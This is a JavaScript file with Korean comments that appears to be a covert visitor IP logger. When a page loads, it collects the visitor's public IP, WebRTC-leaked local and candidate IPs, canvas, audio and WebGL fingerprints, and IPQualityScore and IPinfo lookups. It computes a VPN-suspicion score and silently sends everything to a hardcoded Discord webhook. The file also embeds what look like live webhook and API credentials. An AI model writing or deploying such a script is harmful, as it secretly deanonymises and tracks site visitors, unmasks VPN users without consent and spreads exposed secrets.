/*************************************************
 * CONFIG
 *************************************************/
const WEBHOOK_URL = "https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn";
const IPQS_KEY = "n0hXiA0tP5MMGuctT84vLRAdCfTdUvrE";
const IPINFO_TOKEN = "8b74f7522151ae";

/*************************************************
 * 기본 정보 수집 유틸
 *************************************************/
function getDeviceInfo() {
    return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
        cpuCores: navigator.hardwareConcurrency ?? "N/A",
        touchPoints: navigator.maxTouchPoints ?? 0,
        cookieEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine ? "온라인" : "오프라인",
        doNotTrack: navigator.doNotTrack ?? "N/A"
    };
}

function getScreenInfo() {
    return {
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenAvailWidth: screen.availWidth,
        screenAvailHeight: screen.availHeight,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        pixelRatio: window.devicePixelRatio || 1,
        orientation: screen.orientation?.type ?? "N/A"
    };
}

function getNetworkInfo() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) {
        return {
            effectiveType: "N/A",
            downlink: "N/A",
            rtt: "N/A",
            saveData: "N/A"
        };
    }
    return {
        effectiveType: c.effectiveType ?? "N/A",
        downlink: c.downlink ? `${c.downlink} Mbps` : "N/A",
        rtt: c.rtt ? `${c.rtt}ms` : "N/A",
        saveData: c.saveData ? "활성화" : "비활성화"
    };
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let name = "Unknown";
    let version = "Unknown";

    if (ua.includes("Chrome") && !ua.includes("Edg")) {
        name = "Chrome";
        version = ua.match(/Chrome\/([\d.]+)/)?.[1] ?? "Unknown";
    } else if (ua.includes("Firefox")) {
        name = "Firefox";
        version = ua.match(/Firefox\/([\d.]+)/)?.[1] ?? "Unknown";
    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
        name = "Safari";
        version = ua.match(/Version\/([\d.]+)/)?.[1] ?? "Unknown";
    } else if (ua.includes("Edg")) {
        name = "Edge";
        version = ua.match(/Edg\/([\d.]+)/)?.[1] ?? "Unknown";
    }

    return { browserName: name, browserVersion: version };
}

function getOSInfo() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
    if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
    if (ua.includes("Windows NT 6.2")) return "Windows 8";
    if (ua.includes("Windows NT 6.1")) return "Windows 7";
    if (ua.includes("Mac OS X")) return "macOS";
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    if (ua.includes("Linux")) return "Linux";
    return "Unknown";
}

function getTimezoneInfo() {
    const opts = Intl.DateTimeFormat().resolvedOptions();
    return {
        clientTimezone: opts.timeZone,
        clientLocale: opts.locale,
        clientOffsetMin: new Date().getTimezoneOffset()
    };
}

/*************************************************
 * Fingerprint / 환경 관련 (선택적 분석용)
 *************************************************/
function getWebGLInfo() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl");
        if (!gl) return { vendor: "N/A", renderer: "N/A" };
        const debug = gl.getExtension("WEBGL_debug_renderer_info");
        return {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            unmaskedVendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A",
            unmaskedRenderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A"
        };
    } catch {
        return { vendor: "N/A", renderer: "N/A", unmaskedVendor: "N/A", unmaskedRenderer: "N/A" };
    }
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "16px Arial";
        ctx.fillText("Canvas Fingerprint", 2, 2);
        return canvas.toDataURL().slice(-40);
    } catch {
        return "N/A";
    }
}

function getAudioFingerprint() {
    try {
        const ac = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ac.createOscillator();
        const analyser = ac.createAnalyser();
        osc.connect(analyser);
        analyser.connect(ac.destination);
        osc.start();

        const arr = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(arr);
        ac.close();

        return arr.slice(0, 8).join(",");
    } catch {
        return "N/A";
    }
}

/*************************************************
 * WebRTC / NAT / 후보 IP 분석
 *************************************************/
function detectNATType(candidateStrings) {
    if (!candidateStrings || candidateStrings.length === 0) return "Unknown";
    const hasRelay = candidateStrings.some(c => c.includes(" typ relay"));
    const hasSrflx = candidateStrings.some(c => c.includes(" typ srflx"));
    if (hasRelay) return "Symmetric NAT (VPN/프록시 가능성 매우 높음)";
    if (hasSrflx) return "Restricted / Port-restricted NAT";
    return "Full Cone / Unknown";
}

async function getWebRTCInfo() {
    return new Promise(resolve => {
        const result = {
            blocked: false,
            localIPs: [],
            candidateIPs: [],
            natType: "Unknown",
            vpnLikely: "Unknown"
        };

        let finished = false;
        let pc;

        try {
            pc = new RTCPeerConnection({
                iceServers: [
                    { urls: "stun:stun.l.google.com:19302" },
                    { urls: "stun:stun.cloudflare.com:3478" }
                ]
            });
        } catch {
            result.blocked = true;
            return resolve(result);
        }

        // dummy channel
        try {
            pc.createDataChannel("x");
        } catch {}

        const candidateStrings = [];

        pc.onicecandidate = ev => {
            if (!ev.candidate) return;
            const c = ev.candidate.candidate;
            candidateStrings.push(c);

            const ipMatch = c.match(/\d+\.\d+\.\d+\.\d+/);
            const ip = ipMatch && ipMatch[0];
            if (!ip) return;

            if (c.includes(" typ host") && !result.localIPs.includes(ip)) {
                result.localIPs.push(ip);
            }
            if ((c.includes(" typ srflx") || c.includes(" typ relay")) && !result.candidateIPs.includes(ip)) {
                result.candidateIPs.push(ip);
            }
        };

        pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(() => {
                result.blocked = true;
                finished = true;
                resolve(result);
            });

        setTimeout(() => {
            if (finished) return;
            finished = true;

            if (!result.localIPs.length && !result.candidateIPs.length) {
                result.blocked = true;
            }

            result.natType = detectNATType(candidateStrings);

            const realIP = window._realIP;
            if (!result.blocked && realIP && result.candidateIPs.length) {
                result.vpnLikely = result.candidateIPs.includes(realIP) ? "No" : "Yes";
            } else if (!result.blocked && !result.candidateIPs.length) {
                result.vpnLikely = "Maybe";
            }

            try { pc.close(); } catch {}

            resolve(result);
        }, 3000);
    });
}

/*************************************************
 * IPQualityScore / IPinfo 호출
 *************************************************/
async function fetchIPQualityScore(ip) {
    try {
        const res = await fetch(`https://ipqualityscore.com/api/json/ip/${IPQS_KEY}/${ip}`);
        return await res.json();
    } catch {
        return null;
    }
}

async function fetchIPinfo(ip) {
    try {
        const res = await fetch(`https://api.ipinfo.io/lite/${ip}?token=${IPINFO_TOKEN}`);
        return await res.json();
    } catch {
        return null;
    }
}

/*************************************************
 * Hosting 의심 여부 (IPinfo org 기반)
 *************************************************/
function isHostingOrg(org) {
    if (!org) return false;
    const lower = org.toLowerCase();
    const keywords = [
        "cloudflare",
        "amazon",
        "aws",
        "digitalocean",
        "m247",
        "ovh",
        "vultr",
        "google llc",
        "google cloud",
        "linode",
        "hetzner",
        "contabo",
        "leaseweb",
        "colo",
        "hosting",
        "datacenter",
        "data center",
        "server"
    ];
    return keywords.some(k => lower.includes(k));
}

/*************************************************
 * VPN 점수 계산 (0~100)
 *************************************************/
function calculateVPNScore(ipqs, webrtc, hostingSuspected) {
    let score = 0;

    if (!ipqs) ipqs = {};
    if (!webrtc) webrtc = {};

    // IPQualityScore 기반
    if (ipqs.vpn) score += 45;
    if (ipqs.proxy) score += 25;
    if (ipqs.tor) score += 70;
    if (ipqs.active_vpn) score += 10;
    if (ipqs.active_proxy) score += 10;
    if (ipqs.recent_abuse) score += 10;
    if (typeof ipqs.fraud_score === "number") {
        score += Math.min(25, Math.round(ipqs.fraud_score / 4));
    }

    // Hosting 의심이면 가중치 추가
    if (hostingSuspected) score += 20;

    // WebRTC 기반 보정
    if (webrtc.vpnLikely === "Yes") score += 20;
    if (webrtc.natType && webrtc.natType.includes("Symmetric")) score += 10;

    if (score > 100) score = 100;
    if (score < 0) score = 0;

    return score;
}

/*************************************************
 * 메인 수집 + Discord Webhook 전송
 *************************************************/
async function collectAndSendInfo() {
    try {
        const now = new Date();
        const clientLocalTime = now.toLocaleString("ko-KR");

        // 1) 공인 IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipJson = await ipRes.json();
        const ip = ipJson.ip;
        window._realIP = ip;

        // 2) 병렬로 정보 수집
        const [ipqs, ipinfo, webrtc] = await Promise.all([
            fetchIPQualityScore(ip),
            fetchIPinfo(ip),
            getWebRTCInfo()
        ]);

        const device = getDeviceInfo();
        const screen = getScreenInfo();
        const network = getNetworkInfo();
        const browser = getBrowserInfo();
        const os = getOSInfo();
        const tz = getTimezoneInfo();
        const webgl = getWebGLInfo();
        const canvasFP = getCanvasFingerprint();
        const audioFP = getAudioFingerprint();

        // 3) IPinfo 기반 ASN/ORG 파싱
        let ipinfoASN = null;
        let ipinfoOrgName = null;
        if (ipinfo && ipinfo.org) {
            const parts = ipinfo.org.split(" ");
            ipinfoASN = parts[0] || null;               // e.g. "AS13335"
            ipinfoOrgName = parts.slice(1).join(" ");   // e.g. "Cloudflare, Inc."
        }

        const hostingSuspected = isHostingOrg(ipinfo?.org || "");

        // 4) VPN Score + 결론
        const vpnScore = calculateVPNScore(ipqs, webrtc, hostingSuspected);
        const vpnConclusion =
            vpnScore >= 80
                ? "VPN/프록시 사용 **매우 강하게 의심**"
                : vpnScore >= 50
                ? "VPN/프록시 사용 **가능성 있음**"
                : "VPN/프록시 사용 **가능성 낮음**";

        /*************************************************
         * Discord Embed 생성
         *************************************************/
        const fields = [];

        // 기본 IP + 위치
        fields.push({
            name: "기본 IP 정보",
            value:
                `**IP:** ${ip}\n` +
                `**IPQS 국가/도시:** ${ipqs?.country_code || "N/A"} / ${ipqs?.city || "N/A"}\n` +
                `**IPinfo 국가/도시:** ${ipinfo?.country || "N/A"} / ${ipinfo?.city || "N/A"}\n` +
                `**클라이언트 시간:** ${clientLocalTime}\n` +
                `**클라이언트 타임존:** ${tz.clientTimezone}`,
            inline: false
        });

        // IPinfo 기반 분석
        fields.push({
            name: "IPinfo 분석",
            value:
                `**ASN:** ${ipinfoASN || "N/A"}\n` +
                `**ORG(raw):** ${ipinfo?.org || "N/A"}\n` +
                `**ORG 이름:** ${ipinfoOrgName || "N/A"}\n` +
                `**IPinfo 타임존:** ${ipinfo?.timezone || "N/A"}\n` +
                `**호스팅 의심:** ${hostingSuspected ? "Yes" : "No"}`,
            inline: false
        });

        // IPQualityScore 분석
        fields.push({
            name: "IPQualityScore 분석",
            value:
                `**VPN:** ${ipqs?.vpn ? "Yes" : "No"}\n` +
                `**Proxy:** ${ipqs?.proxy ? "Yes" : "No"}\n` +
                `**TOR:** ${ipqs?.tor ? "Yes" : "No"}\n` +
                `**Active VPN:** ${ipqs?.active_vpn ? "Yes" : "No"}\n` +
                `**Active Proxy:** ${ipqs?.active_proxy ? "Yes" : "No"}\n` +
                `**Fraud Score:** ${ipqs?.fraud_score ?? "N/A"}\n` +
                `**최근 악용 기록:** ${ipqs?.recent_abuse ? "Yes" : "No"}\n` +
                `**Abuse Velocity:** ${ipqs?.abuse_velocity || "N/A"}`,
            inline: false
        });

        // WebRTC / NAT 분석
        fields.push({
            name: "WebRTC & NAT 분석",
            value:
                `**WebRTC 차단됨:** ${webrtc.blocked ? "Yes" : "No"}\n` +
                `**로컬 IP:** ${webrtc.localIPs.join(", ") || "N/A"}\n` +
                `**후보 Public IP:** ${webrtc.candidateIPs.join(", ") || "N/A"}\n` +
                `**NAT 타입 추정:** ${webrtc.natType}\n` +
                `**WebRTC 기반 VPN 추정:** ${webrtc.vpnLikely}`,
            inline: false
        });

        // 클라이언트 환경 요약
        fields.push({
            name: "클라이언트 환경",
            value:
                `**OS / 브라우저:** ${os} / ${browser.browserName} ${browser.browserVersion}\n` +
                `**플랫폼:** ${device.platform}\n` +
                `**언어:** ${device.language} (${device.languages})\n` +
                `**화면:** ${screen.screenWidth}x${screen.screenHeight} (윈도우: ${screen.windowWidth}x${screen.windowHeight})\n` +
                `**네트워크:** type=${network.effectiveType}, downlink=${network.downlink}, rtt=${network.rtt}, saveData=${network.saveData}\n` +
                `**WebGL:** vendor=${webgl.vendor}, renderer=${webgl.renderer}\n` +
                `**Canvas FP:** ${canvasFP}\n` +
                `**Audio FP:** ${audioFP}`,
            inline: false
        });

        // 최종 판단
        fields.push({
            name: "VPN/프록시 종합 판단",
            value:
                `**VPN 점수:** ${vpnScore} / 100\n` +
                `**결론:** ${vpnConclusion}`,
            inline: false
        });

        const embed = {
            title: "새로운 방문자 분석 보고서",
            description: "페이지 접속과 동시에 자동 수집된 IP/환경 정보입니다.",
            color: 0x5865f2,
            timestamp: now.toISOString(),
            fields,
            footer: {
                text: "자동 수집 시스템 (IPQualityScore + IPinfo + WebRTC)"
            }
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (e) {
        console.error("정보 수집/전송 실패:", e);
    }
}

window.addEventListener("load", collectAndSendInfo);
